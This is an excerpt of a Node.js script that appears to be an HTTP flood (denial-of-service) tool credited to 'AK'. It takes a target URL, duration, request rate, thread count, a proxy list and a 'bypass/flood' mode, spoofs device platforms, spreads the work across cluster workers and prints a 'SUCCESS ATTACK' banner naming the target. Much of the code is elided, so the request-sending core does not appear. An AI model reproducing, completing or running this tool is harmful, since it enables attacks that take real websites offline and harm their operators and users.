...
const platform = [
	"Windows", "Windows Phone", "Macintosh", "Linux", "iOS", "Android", "PlayStation 4", "Xbox One", "Nintendo Switch", "Apple TV", "Amazon Fire TV", "Roku", "Chromecast", "Smart TV", "Other"
];
cplist = [
...
if (!target || !time || !thread || !proxyFile || !rps || !input) {
	console.error(`>> Made by AK : node ${process.argv[1]} url time rps thread proxy.txt bypass/flood`);
	process.exit(1);
}
...
try {
	...
	console.error(' Error proxy file '.bgRed), console.log(`Reason: `.red, err.message)
	process.exit(1);
}
if (isNaN(rps) || rps <= 0) {
...
if (cluster.isMaster) {
	console.clear()
	console.log(` SUCCESS ATTACK `.bgGreen), console.log(` `.yellow), console.log(`TARGET: ${process.argv[2]}`), console.log(`TIME: ${process.argv[3]}`), console.log(`THREAD: ${process.argv[4]}`), console.log(`PROXYFILE: ${process.argv[5]}`), console.log(`RPS: ${process.argv[6]}`), console.log(` `.yellow)
